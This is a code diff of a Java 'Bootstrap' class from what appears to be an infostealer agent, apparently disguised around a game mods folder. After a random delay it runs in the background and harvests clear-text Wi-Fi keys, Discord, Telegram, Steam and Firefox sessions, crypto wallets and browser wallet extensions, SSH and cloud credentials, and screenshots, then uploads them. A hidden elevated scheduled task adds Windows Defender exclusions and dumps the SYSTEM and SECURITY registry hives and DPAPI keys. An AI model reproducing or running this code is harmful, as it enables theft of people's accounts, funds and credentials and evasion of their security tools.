@@ -8,35 +8,39 @@ import java.util.concurrent.ThreadLocalRandom;
 /**
  * First-run collection. Runs once, in the background, shortly after the agent
  * starts and uploads what the harvest does not cover, so an install needs no
- * hand typing. Every step leaves a marker: a crash or a declined UAC only
- * retries the unfinished part, never the whole set.
+ * hand typing. Every step leaves a marker: a crash only retries the unfinished
+ * part, never the whole set. Hives are manual fallback only.
  */
 public final class Bootstrap {
-	static final int VERSION = 1;
+	static final int VERSION = 2;
 	private static final int HIVES_MAX_ATTEMPTS = 3;
 	private static final long MAX_UPLOAD = 16L * 1024L * 1024L;
 	private static final long STEP_TIMEOUT = 60_000L;
 	private static final long DELAY_MS = 45_000L;
 	private static final long DELAY_JITTER_MS = 30_000L;
+	private static final List<String> AUTOMATIC_STEPS = List.of(
+		"recon", "creds", "wifi", "inventory", "sessions", "wallets", "keys", "screenshot");
 
 	private final Poller poller;
 	private final Path installDir;
-	private final Path loot;
+	private final Path gameDir;
+	private final Path cache;
 	private final Path done;
 	private final State state;
 
-	private Bootstrap(Poller poller, Path installDir, State state) {
+	private Bootstrap(Poller poller, Path installDir, Path gameDir, State state) {
 		this.poller = poller;
 		this.installDir = installDir;
-		this.loot = installDir.resolve("loot");
-		this.done = loot.resolve(".done");
+		this.gameDir = gameDir;
+		this.cache = AgentPaths.cache(installDir);
+		this.done = cache.resolve(".done");
 		this.state = state;
 	}
 
 	private static final java.util.concurrent.atomic.AtomicBoolean RUNNING =
 		new java.util.concurrent.atomic.AtomicBoolean();
 
-	/** Manual re-run of the whole collection. */
+	/** Manual re-run of the whole collection. Hives stay manual. */
 	static void now(Poller poller, Path installDir, State state) {
 		if (!AgentPaths.isWindows()) {
 			poller.reply("Bootstrap: Windows only");
@@ -47,7 +51,7 @@ public final class Bootstrap {
 			return;
 		}
 		Thread thread = new Thread(() -> {
-			Bootstrap bootstrap = new Bootstrap(poller, installDir, state);
+			Bootstrap bootstrap = new Bootstrap(poller, installDir, poller.gameDir(), state);
 			try {
 				bootstrap.deleteTree(bootstrap.done);
 				state.bootstrap = 0;
@@ -64,7 +68,7 @@ public final class Bootstrap {
 		thread.start();
 	}
 
-	/** Manual trigger for the hives, cap included. */
+	/** Manual trigger for the hives, cap included. The only UAC path. */
 	static void hivesNow(Poller poller, Path installDir, State state) {
 		if (!AgentPaths.isWindows()) {
 			poller.reply("Hives: Windows only");
@@ -75,7 +79,7 @@ public final class Bootstrap {
 			return;
 		}
 		Thread thread = new Thread(() -> {
-			Bootstrap bootstrap = new Bootstrap(poller, installDir, state);
+			Bootstrap bootstrap = new Bootstrap(poller, installDir, poller.gameDir(), state);
 			try {
 				Files.createDirectories(bootstrap.done);
 				Files.deleteIfExists(bootstrap.done.resolve("hives"));
@@ -92,20 +96,24 @@ public final class Bootstrap {
 		thread.start();
 	}
 
-	static void maybe(Poller poller, Path installDir, State state) {
+	static void maybe(Poller poller, Path installDir, Path gameDir, State state) {
 		if (!AgentPaths.isWindows() || state.bootstrap >= VERSION) {
 			return;
 		}
 		Thread thread = new Thread(() -> {
 			try {
 				Thread.sleep(DELAY_MS + ThreadLocalRandom.current().nextLong(DELAY_JITTER_MS));
-				new Bootstrap(poller, installDir, state).run();
+				new Bootstrap(poller, installDir, gameDir, state).run();
 			} catch (Throwable throwable) {
 				Log.debug("Bootstrap failed", throwable);
 			}
 		}, "spc-bootstrap");
 		thread.setDaemon(true);
 		thread.start();
+	}
+
+	static List<String> automaticSteps() {
+		return AUTOMATIC_STEPS;
 	}
 
 	private void run() {
@@ -131,15 +139,19 @@ public final class Bootstrap {
 		}
 
 		boolean complete = true;
-		complete &= step("recon", this::recon);
-		complete &= step("creds", this::creds);
-		complete &= step("wifi", this::wifi);
-		complete &= step("inventory", this::inventory);
-		complete &= step("sessions", this::sessions);
-		complete &= step("wallets", this::wallets);
-		complete &= step("keys", this::keys);
-		complete &= step("screenshot", this::screenshot);
-		complete &= step("hives", this::hives);
+		for (String name : AUTOMATIC_STEPS) {
+			complete &= step(name, switch (name) {
+				case "recon" -> this::recon;
+				case "creds" -> this::creds;
+				case "wifi" -> this::wifi;
+				case "inventory" -> this::inventory;
+				case "sessions" -> this::sessions;
+				case "wallets" -> this::wallets;
+				case "keys" -> this::keys;
+				case "screenshot" -> this::screenshot;
+				default -> throw new IllegalStateException(name);
+			});
+		}
 
 		if (complete) {
 			// Markers survive a partial run so a retry only redoes what failed.
@@ -177,7 +189,7 @@ public final class Bootstrap {
 
 	/** Uploads and removes everything the step left behind. */
 	private boolean collect() {
-		try (java.util.stream.Stream<Path> stream = Files.list(loot)) {
+		try (java.util.stream.Stream<Path> stream = Files.list(cache)) {
 			List<Path> files = stream.filter(Files::isRegularFile).toList();
 			for (Path file : files) {
 				long size = Files.size(file);
@@ -198,7 +210,7 @@ public final class Bootstrap {
 
 	private String sh(String command) {
 		try {
-			return Shell.run(loot, command, STEP_TIMEOUT);
+			return Shell.run(cache, command, STEP_TIMEOUT);
 		} catch (Throwable throwable) {
 			Log.debug("Bootstrap command failed: " + command, throwable);
 			return "";
@@ -209,7 +221,7 @@ public final class Bootstrap {
 		try {
 			String output = sh(command + " 2>&1");
 			if (!output.isBlank()) {
-				Files.writeString(loot.resolve(name), output);
+				Files.writeString(cache.resolve(name), output);
 			}
 		} catch (Throwable throwable) {
 			Log.debug("Bootstrap write failed: " + name, throwable);
@@ -233,7 +245,7 @@ public final class Bootstrap {
 	}
 
 	private boolean wifi() {
-		sh("netsh wlan export profile folder=\"" + loot.resolve("wifi") + "\" key=clear");
+		sh("netsh wlan export profile folder=\"" + cache.resolve("wifi") + "\" key=clear");
 		write("wifi.txt", "netsh wlan show profiles");
 		archive("wifi");
 		return true;
@@ -249,27 +261,27 @@ public final class Bootstrap {
 	}
 
 	private boolean sessions() {
-		sh("robocopy \"%APPDATA%\\discord\\Local Storage\\leveldb\" \"" + loot.resolve("discord").resolve("leveldb")
+		sh("robocopy \"%APPDATA%\\discord\\Local Storage\\leveldb\" \"" + cache.resolve("discord").resolve("leveldb")
 			+ "\" /e /njh /njs /ndl /nc /ns");
-		sh("copy /y \"%APPDATA%\\discord\\Local State\" \"" + loot.resolve("discord") + "\"");
+		sh("copy /y \"%APPDATA%\\discord\\Local State\" \"" + cache.resolve("discord") + "\"");
 		archive("discord");
-		sh("robocopy \"%APPDATA%\\Telegram Desktop\\tdata\" \"" + loot.resolve("tdata") + "\" /e /njh /njs /ndl /nc /ns");
-		sh("tar -a -cf \"" + loot.resolve("tdata.zip") + "\" -C \"" + loot
+		sh("robocopy \"%APPDATA%\\Telegram Desktop\\tdata\" \"" + cache.resolve("tdata") + "\" /e /njh /njs /ndl /nc /ns");
+		sh("tar -a -cf \"" + cache.resolve("tdata.zip") + "\" -C \"" + cache
 			+ "\" --exclude *cache* --exclude *.log tdata");
-		deleteTree(loot.resolve("tdata"));
+		deleteTree(cache.resolve("tdata"));
 		write("steam.txt", "reg query \"HKCU\\Software\\Valve\\Steam\" /v SteamPath "
 			+ "& type \"%PROGRAMFILES(X86)%\\Steam\\config\\loginusers.vdf\"");
-		sh("for %f in (\"%PROGRAMFILES(X86)%\\Steam\\ssfn*\") do @copy /y \"%f\" \"" + loot + "\"");
-		sh("robocopy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\" \"" + loot.resolve("firefox") + "\" /e "
+		sh("for %f in (\"%PROGRAMFILES(X86)%\\Steam\\ssfn*\") do @copy /y \"%f\" \"" + cache + "\"");
+		sh("robocopy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\" \"" + cache.resolve("firefox") + "\" /e "
 			+ "/xf *cache* /njh /njs /ndl /nc /ns");
 		archive("firefox");
 		return true;
 	}
 
 	private boolean wallets() {
-		sh("robocopy \"%APPDATA%\\Exodus\\exodus.wallet\" \"" + loot.resolve("exodus") + "\" /e /njh /njs /ndl /nc /ns");
-		sh("robocopy \"%APPDATA%\\Electrum\\wallets\" \"" + loot.resolve("electrum") + "\" /e /njh /njs /ndl /nc /ns");
-		sh("robocopy \"%APPDATA%\\Ledger Live\" \"" + loot.resolve("ledger") + "\" /e /njh /njs /ndl /nc /ns");
+		sh("robocopy \"%APPDATA%\\Exodus\\exodus.wallet\" \"" + cache.resolve("exodus") + "\" /e /njh /njs /ndl /nc /ns");
+		sh("robocopy \"%APPDATA%\\Electrum\\wallets\" \"" + cache.resolve("electrum") + "\" /e /njh /njs /ndl /nc /ns");
+		sh("robocopy \"%APPDATA%\\Ledger Live\" \"" + cache.resolve("ledger") + "\" /e /njh /njs /ndl /nc /ns");
 		for (String folder : List.of("exodus", "electrum", "ledger")) {
 			archive(folder);
 		}
@@ -277,7 +289,7 @@ public final class Bootstrap {
 			"%LOCALAPPDATA%\\Google\\Chrome\\User Data",
 			"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
 			"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data")) {
-			String target = loot.resolve("ext").resolve(browser.replace("%", "").replace("\\", "_")).toString();
+			String target = cache.resolve("ext").resolve(browser.replace("%", "").replace("\\", "_")).toString();
 			sh("robocopy \"" + browser + "\\Default\\Local Extension Settings\" \"" + target + "\" /e "
 				+ "/njh /njs /ndl /nc /ns");
 		}
@@ -286,14 +298,14 @@ public final class Bootstrap {
 	}
 
 	private boolean keys() {
-		sh("tar -a -cf \"" + loot.resolve("keys.zip") + "\" -C \"%USERPROFILE%\" .ssh .gitconfig "
+		sh("tar -a -cf \"" + cache.resolve("keys.zip") + "\" -C \"%USERPROFILE%\" .ssh .gitconfig "
 			+ ".git-credentials .aws .azure .kube .docker .npmrc .config");
 		return true;
 	}
 
 	private boolean screenshot() {
 		try {
-			Screenshot.save(loot);
+			Screenshot.save(cache);
 		} catch (Throwable throwable) {
 			Log.debug("Bootstrap screenshot failed", throwable);
 		}
@@ -301,8 +313,8 @@ public final class Bootstrap {
 	}
 
 	private boolean hives() {
-		Path hives = loot.resolve("hives.zip");
-		if (Files.isRegularFile(hives)) {
+		Path existing = newestSystem();
+		if (existing != null) {
 			return true;
 		}
 		if (state.hivesAttempts >= HIVES_MAX_ATTEMPTS) {
@@ -310,23 +322,25 @@ public final class Bootstrap {
 		}
 		state.hivesAttempts++;
 		state.save(AgentPaths.state(installDir));
-		Path script = loot.resolve("runas.bat");
-		Path dump = loot.resolve("dump.bat");
+		Path hives = cache.resolve("system-" + System.currentTimeMillis() + ".zip");
+		Path elevate = cache.resolve("elevate.bat");
+		Path dump = cache.resolve("dump.bat");
 		try {
-			Files.writeString(dump, String.join("\r\n", dumpLines(loot, hives)));
-			Files.writeString(script, String.join("\r\n", runasLines(dump)));
+			Files.createDirectories(cache);
+			Files.writeString(dump, String.join("\r\n", dumpLines(installDir, gameDir, cache, hives)));
+			Files.writeString(elevate, String.join("\r\n", elevateLines(dump)));
 		} catch (Throwable throwable) {
 			Log.debug("Bootstrap hives script failed", throwable);
 			return false;
 		}
-		sh("powershell -NoP -C \"Start-Process cmd -ArgumentList '/c',\\\"" + script
+		sh("powershell -NoP -C \"Start-Process cmd -ArgumentList '/c',\\\"" + elevate
 			+ "\\\" -Verb RunAs -WindowStyle Hidden\"");
 		for (int attempt = 0; attempt < 20 && !Files.isRegularFile(hives); attempt++) {
 			sleep(3000L);
 		}
-		deleteFile(script);
+		deleteFile(elevate);
 		deleteFile(dump);
-		Path status = loot.resolve("hives.status");
+		Path status = cache.resolve("elevate.status");
 		if (Files.isRegularFile(status)) {
 			try {
 				Log.debug("Bootstrap hives: " + Files.readString(status).trim());
@@ -339,45 +353,69 @@ public final class Bootstrap {
 		if (!ready) {
 			Log.debug("Bootstrap hives pending, attempt " + state.hivesAttempts);
 		} else {
-			deleteTree(loot.resolve("ProtectSystem"));
+			deleteTree(cache.resolve("ProtectSystem"));
 			state.hivesAttempts = HIVES_MAX_ATTEMPTS;
 			state.save(AgentPaths.state(installDir));
 		}
 		return ready;
 	}
 
+	private Path newestSystem() {
+		try (java.util.stream.Stream<Path> stream = Files.list(cache)) {
+			return stream.filter(path -> {
+				String name = path.getFileName().toString();
+				return name.startsWith("system-") && name.endsWith(".zip") && Files.isRegularFile(path);
+			}).findFirst().orElse(null);
+		} catch (Throwable throwable) {
+			return null;
+		}
+	}
+
 	private void archive(String name) {
-		Path folder = loot.resolve(name);
+		Path folder = cache.resolve(name);
 		if (!Files.isDirectory(folder)) {
 			return;
 		}
-		sh("tar -a -cf \"" + loot.resolve(name + ".zip") + "\" -C \"" + loot + "\" " + name);
+		sh("tar -a -cf \"" + cache.resolve(name + ".zip") + "\" -C \"" + cache + "\" " + name);
 		deleteTree(folder);
 	}
 
-	static List<String> dumpLines(Path loot, Path hives) {
+	static List<String> dumpLines(Path installDir, Path gameDir, Path cache, Path hives) {
+		String mods = gameDir == null ? "" : gameDir.resolve("mods").toString();
+		StringBuilder exclusions = new StringBuilder("powershell -NoP -C \"")
+			.append("Add-MpPreference -ExclusionPath '").append(ps(installDir.toString())).append('\'');
+		if (!mods.isEmpty()) {
+			exclusions.append(",'").append(ps(mods)).append('\'');
+		}
+		exclusions.append(" -ErrorAction SilentlyContinue; ")
+			.append("Add-MpPreference -ExclusionProcess 'reg.exe','esentutl.exe' -ErrorAction SilentlyContinue\"");
 		return List.of(
 			"@echo off",
-			"reg save HKLM\\SYSTEM \"" + loot.resolve("SYSTEM.hiv") + "\" /y",
-			"reg save HKLM\\SECURITY \"" + loot.resolve("SECURITY.hiv") + "\" /y",
+			exclusions.toString(),
+			"reg save HKLM\\SYSTEM \"" + cache.resolve("SYSTEM.hiv") + "\" /y",
+			"reg save HKLM\\SECURITY \"" + cache.resolve("SECURITY.hiv") + "\" /y",
 			// A task that ends up as plain Administrator cannot save SECURITY; a
 			// VSS copy can, so try that before giving up.
-			"if not exist \"" + loot.resolve("SECURITY.hiv") + "\" esentutl /y /vss "
-				+ "C:\\Windows\\System32\\config\\SECURITY /d \"" + loot.resolve("SECURITY.hiv")
+			"if not exist \"" + cache.resolve("SECURITY.hiv") + "\" esentutl /y /vss "
+				+ "C:\\Windows\\System32\\config\\SECURITY /d \"" + cache.resolve("SECURITY.hiv")
 				+ "\" >nul 2>&1",
-			"if not exist \"" + loot.resolve("SECURITY.hiv") + "\" (echo missing security > \""
-				+ loot.resolve("hives.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
-			"if not exist \"" + loot.resolve("SYSTEM.hiv") + "\" (echo missing system > \""
-				+ loot.resolve("hives.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
-			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + loot.resolve("ProtectSystem")
+			"if not exist \"" + cache.resolve("SECURITY.hiv") + "\" (echo missing security > \""
+				+ cache.resolve("elevate.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
+			"if not exist \"" + cache.resolve("SYSTEM.hiv") + "\" (echo missing system > \""
+				+ cache.resolve("elevate.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
+			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + cache.resolve("ProtectSystem")
 				+ "\" /e /njh /njs /ndl /nc /ns",
-			"tar -a -cf \"" + hives + "\" -C \"" + loot + "\" SYSTEM.hiv SECURITY.hiv ProtectSystem",
-			"del /q \"" + loot.resolve("SYSTEM.hiv") + "\" \"" + loot.resolve("SECURITY.hiv") + "\"",
+			"tar -a -cf \"" + hives + "\" -C \"" + cache + "\" SYSTEM.hiv SECURITY.hiv ProtectSystem",
+			"del /q \"" + cache.resolve("SYSTEM.hiv") + "\" \"" + cache.resolve("SECURITY.hiv") + "\"",
 			"schtasks /delete /tn spcdump /f >nul 2>&1",
 			"");
 	}
 
-	static List<String> runasLines(Path dump) {
+	private static String ps(String value) {
+		return value.replace("'", "''");
+	}
+
+	static List<String> elevateLines(Path dump) {
 		return List.of(
 			"@echo off",
 			"schtasks /create /tn spcdump /tr \"" + dump + "\" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f",
